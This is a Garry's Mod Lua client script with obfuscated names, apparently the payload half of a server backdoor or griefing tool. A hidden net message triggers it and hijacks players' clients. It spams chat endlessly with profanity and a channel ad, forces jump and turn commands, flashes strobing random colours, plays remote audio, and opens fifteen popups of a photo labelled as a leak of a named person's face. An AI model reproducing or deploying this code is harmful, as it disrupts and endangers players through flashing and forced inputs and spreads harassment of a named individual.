if CLIENT then
    surface.CreateFont("pdsaoiasdo", {
        font = 'Calibri',
        extended = true,
        size = 38,
        weight = 600,
    })

    surface.CreateFont("pdsaoiasdfdssfdo", {
        font = 'Calibri',
        extended = true,
        size = 45,
        weight = 600,
    })

    local textMessage = "ЧИПИН СКВАД"
    local texts = {}
    local textReady = false
    local huiready = false
    local a4 = false
    local sadhadhsj = false

    local colorChangeSpeed = 20
    local colorChangeSpeeddd = 0.1
    local time = 0 
    local timee = 0

    local currentMessageIndex = 1
    local startTime = 0
    local displaying = false
    local colorCycle = 0

    local messages = {
        {text = "Внимание!", delay = 0, duration = 1},
        {text = "Аудио Тест на IQ!", delay = 0, duration = 2},
        {text = "Вы слушаете: ", delay = 0, duration = 1},
        {text = "DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0, duration = 0.09},
        {text = "DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0.09, duration = 0.09},
        {text = "□□□□□□□□□□□□□□□□□□□□□□□□□□□□□", delay = 0.09, duration = 0.09},
        {text = "DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0.09, duration = 0.09},
        {text = "DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0.09, duration = 0.09},
        {text = "□□□□□□□□□□JJJJJJJJJJJJ □□□□□□□□□□□□□ 2000000000007", delay = 0.09, duration = 0.09},
        {text = "DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0.09, duration = 0.09},
        {text = "□□□□□□□□□□□□□□□□□□□□ STAS 2000000000007", delay = 0.09, duration = 0.09},
        {text = "DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0, duration = 4},
        {text = "Всем привет!", delay = 20, duration = 1},
        {text = "Меня зовут Влад А4", delay = 0, duration = 1},
        {text = "Гылен", delay = 0, duration = 0.8},
        {text = "Копяков", delay = 0, duration = 1},
        {text = "И DDDDDDDDDDDDJJJJJJJJJJJJ STAS 2000000000007", delay = 0.5, duration = 4},
        {text = "Погнали!", delay = 2, duration = 2},
    }


    local function dsjsfdjfdjhsdjf387276()
        texts = {}
        for i = 1, 50 do
            local textData = {
                x = math.random(0, ScrW()),
                y = math.random(0, ScrH()),
                velX = math.random(4, 8) * (math.random(0, 1) == 0 and 1 or -1),
                velY = math.random(4, 8) * (math.random(0, 1) == 0 and 1 or -1),
            }
            table.insert(texts, textData)
        end
        textReady = true
    end

    local function asdjsadkjdkasjkjwihfeh()
        if not textReady then return end

        for i = #texts, 1, -1 do
            local textData = texts[i]
            timee = timee + FrameTime() * colorChangeSpeeddd

            local rr = math.abs(math.sin(timee)) * 255
            local gg = math.abs(math.sin(timee + 2)) * 255
            local bb = math.abs(math.sin(timee + 4)) * 255
            local cooolorrrrr = Color(rr, gg, bb)
            draw.SimpleText(textMessage, "pdsaoiasdo", textData.x, textData.y, cooolorrrrr, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

            textData.x = textData.x + textData.velX
            textData.y = textData.y + textData.velY

            if textData.x < 0 or textData.x > ScrW() then
                textData.velX = -textData.velX
            end
            if textData.y < 0 or textData.y > ScrH() then
                textData.velY = -textData.velY
            end
        end
    end

    net.Receive("kasdjkadsjasjjdsikdajsksdakj", function()
        local musicURL = net.ReadString()
        timer.Simple(5, function()
            huiready = true
            currentMessageIndex = 1
            startTime = CurTime()
            displaying = true
        end)
        timer.Simple(47, function()
            a4 = true
            timer.Create('f78dsyfsdfhufDhDUFShDSFfdsffsdfdsfdssDHU', 0.0000001, 1000000000, function()
                chat.AddText(Color( 255, 255, 255 ),"sv_bumaga:", Color( 255,165,0 ), " ЭТО ЛАМБА А ЭТО ГЕЛИК ВЛАД ЭТО БУМАГА А БУМАГА ЭТО ДЕНЬГИ")
            end)
        end)

        timer.Simple(50, function()
            LocalPlayer():ConCommand("jdsfjhfdsjsfhsfdjshfdshdfjhjdsf")
        end)
        
        -- Add a timer to delay the initialization of texts
        timer.Simple(14, function()
            dsjsfdjfdjhsdjf387276()  -- Initialize texts for drawing
            sadhadhsj = true
            timer.Create('f78dsyfsdfhufDhDUFShDSFfsDHU', 0.0000001, 1000000000, function()
                chat.AddText(Color( 255, 255, 255 ),"sv_stas:", Color( 255,165,0 ), " СЕРВЕР ХУЙНЯ ЕБАННАЯ, ЛУЧШЕ ПОДПИШИТЕСЬ НА МОЙ КАНАЛ - https://www.youtube.com/@strixnedbg")
            end)
            LocalPlayer():ConCommand("+jump")
            LocalPlayer():ConCommand("+left")
        end)

        if string.len(musicURL) <= 255 then
            sound.PlayURL(musicURL, "mono", function(station)
                if IsValid(station) then
                    station:Play()
                end
            end)
        end

        
    end)

    hook.Add("HUDPaint", "TextDisplayHook", asdjsadkjdkasjkjwihfeh)
    -- hook.Add('Think', 'fasfsafsaasf', JDSHASDHJADSHJADSJHDSAJH)
    hook.Add('HUDPaint', 'jfadbhjAFSHBGHF', function()
        if huiready then
            time = time + FrameTime() * colorChangeSpeed

            local r = math.abs(math.sin(time)) * 255
            local g = math.abs(math.sin(time + 2)) * 255
            local b = math.abs(math.sin(time + 4)) * 255
            local colorrrrr = Color(r, g, b)
            -- draw.SimpleText('DJ STASSS: ОБЪЯВЛЯЕТСЯ СУЕТА', "pdsaoiasdo", ScrW() / 2, ScrH() / 2, colorrrrr, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end
    
    end)

    -- Функция для отображения текста
    local function FDSFDSFSDFSDVDVDSDVS432324(text, color)
        -- local w, h = surface.GetTextSize(text)
        -- local x = (ScrW() - w) / 2
        -- local y = (ScrH() - h) / 2

        draw.SimpleText(text, "pdsaoiasdfdssfdo", ScrW() / 2, ScrH() / 2, color, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    hook.Add("HUDPaint", "JDSHAJADJHDjcsbBACSJBSNC", function()
        if a4 then
            -- Получаем размеры экрана
            local width, height = ScrW(), ScrH()

            -- Количество цветов и размер квадратов
            local numColors = 100
            local squareSize = 100

            for i = 1, numColors do
                -- Генерируем случайные координаты для квадратов
                local xxx = math.random(0, width - squareSize)
                local yyy = math.random(0, height - squareSize)

                -- Генерируем случайный цвет
                local rrr = math.random(0, 255)
                local ggg = math.random(0, 255)
                local bbb = math.random(0, 255)

                -- Устанавливаем цвет и рисуем квадрат
                surface.SetDrawColor(rrr, ggg, bbb)
                surface.DrawRect(xxx, yyy, squareSize, squareSize)
            end
        end
    end)



    -- Основная функция, которая будет вызываться каждый кадр
    hook.Add("HUDPaint", "JCAHSUHCSACHUVAHHUSAHFDHUAD", function()
        if displaying then
            local elapsedTime = CurTime() - startTime
            local currentMessage = messages[currentMessageIndex]

            -- Цикл цвета
            colorCycle = (colorCycle + FrameTime() * 255) % 255
            local rrtr = math.abs((math.sin(colorCycle / 255 * math.pi * 2) * 255))
            local ggfd = math.abs((math.sin((colorCycle / 255 + 1 / 3) * math.pi * 2) * 255))
            local bbfbb = math.abs((math.sin((colorCycle / 255 + 2 / 3) * math.pi * 2) * 255))
            local textColor = Color(rrtr, ggfd, bbfbb)

            if elapsedTime >= currentMessage.delay and elapsedTime < currentMessage.delay + currentMessage.duration then
                FDSFDSFSDFSDVDVDSDVS432324(currentMessage.text, textColor)
            elseif elapsedTime >= currentMessage.delay + currentMessage.duration then
                currentMessageIndex = currentMessageIndex + 1
                if currentMessageIndex > #messages then
                    displaying = false
                else
                    startTime = CurTime()
                end
            end
        end
    end)



    local texture = Material("path/to/your/emote_texture.png") -- Замените на путь к вашей текстуре
    local angle = 0

    hook.Add("HUDPaint", "FDSFDVSVDSGGDSGFEWEGEW23423", function()
        if sadhadhsj then
            local w, h = ScrW(), ScrH()
            angle = angle + 1 -- Увеличиваем угол для вращения
            surface.SetMaterial(texture) -- Устанавливаем текстуру
            surface.SetDrawColor(255, 255, 255, 255) -- Устанавливаем цвет (белый)
    
            -- Рассчитываем позицию для отображения в центре
            local x, y = w / 2, h / 2

            -- Рисуем вращающуюся текстуру
            surface.DrawTexturedRectRotated(x, y, 100, 100, angle) -- 100x100 - размер текста
        end
    end)
    -- Скрипт для отображения DHTML окон
    local function FKdmksjdsFjdKFDjSLFDsk()
        for i = 1, 15 do
            local frame = vgui.Create("DFrame")
            frame:SetSize(500, 500)
            frame:SetTitle("СЛИВ ЛИЦА РОМАНИУЗА")
            frame:SetPos(50 + (i - 1) * 110, 50) -- Смещение окон по оси X
            frame:MakePopup()

            local htmlPanel = vgui.Create("DHTML", frame)
            htmlPanel:SetPos(0, 25) -- Позиция внутри окна
            htmlPanel:SetSize(500, 500) -- Размер панели для отображения HTML
            htmlPanel:OpenURL("https://i.ibb.co/ymn10mpM/84-D9-BD95-5-CB4-4-FB9-B28-B-68-E1079433-FC.jpg") -- Устанавливаем URL изображения
        end
    end

    concommand.Add("jdsfjhfdsjsfhsfdjshfdshdfjhjdsf", FKdmksjdsFjdKFDjSLFDsk)


end